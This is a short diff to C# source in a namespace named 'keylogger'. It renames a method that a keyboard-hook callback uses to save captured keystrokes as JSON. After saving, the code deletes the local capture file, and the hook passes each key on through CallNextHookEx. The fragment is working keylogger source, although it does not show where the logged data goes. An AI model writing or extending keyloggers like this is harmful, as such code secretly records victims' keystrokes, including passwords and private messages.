@@ -70,7 +70,7 @@ namespace keylogger
                 Console.Write($"[{(Keys)vkCode}]");
                 if (wordCounter > 10)
                 {
-                    NewMethod();
+                    saveLog();
                     File.Delete(actualFile);
                     wordCounter = 0;
                     fileCounter++;
@@ -81,7 +81,7 @@ namespace keylogger
             return CallNextHookEx(IntPtr.Zero, nCode, wParam, lParam);
         }
 
-        private static async Task NewMethod()
+        private static void saveLog()
         {
             var jsonData = new
             {
